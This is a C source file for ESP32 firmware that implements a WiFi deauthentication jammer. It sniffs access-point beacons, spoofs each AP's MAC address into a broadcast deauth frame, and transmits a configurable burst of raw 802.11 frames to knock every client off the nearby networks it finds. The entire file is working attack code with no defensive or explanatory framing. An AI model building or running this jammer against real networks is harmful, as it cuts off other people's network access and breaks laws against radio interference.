#include "esp_log.h"
#include "wifi.h"
#include "beacons.h"

#define JAM_COUNT               CONFIG_JAM_COUNT

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

static uint8_t deauth_frame[] = {
    0xc0, 0x00,                             // Frame control (deauth code: 12)
    0x00, 0x00,                             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Destination (broadcast)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // Transmitter/Source (router)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // BSSID
    0x00, 0x00,                             // Fragment and Sequence number
    0x07, 0x00                              // Reason code: Class 3 frame received from nonassociated STA
};

void wifi_deauth_init() {
    sniffed_beacons = Beacon_set_create(0);
}

void wifi_deauth()
{
    int length = Beacon_set_size(sniffed_beacons);
    Beacon* beacons = Beacon_set_items(sniffed_beacons);
    for (int i = 0; i < length; i++) {
        Beacon b = beacons[i];
        deauth_frame[10] = b.source_mac[0];
        deauth_frame[11] = b.source_mac[1];
        deauth_frame[12] = b.source_mac[2];
        deauth_frame[13] = b.source_mac[3];
        deauth_frame[14] = b.source_mac[4];
        deauth_frame[15] = b.source_mac[5];
        deauth_frame[16] = b.source_mac[0];
        deauth_frame[17] = b.source_mac[1];
        deauth_frame[18] = b.source_mac[2];
        deauth_frame[19] = b.source_mac[3];
        deauth_frame[20] = b.source_mac[4];
        deauth_frame[21] = b.source_mac[5];

        for (int k = 0; k < JAM_COUNT; k++) {
            ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
            if(k % 5 == 0) {
                vTaskDelay(50 / portTICK_PERIOD_MS);
            }
        }
        ESP_LOGI("wifi_jam", 
            "%d frames sent from AP with MAC: %02x:%02x:%02x:%02x:%02x:%02x",
            JAM_COUNT,
            b.source_mac[0], b.source_mac[1], b.source_mac[2], 
            b.source_mac[3], b.source_mac[4], b.source_mac[5]);
    }
}
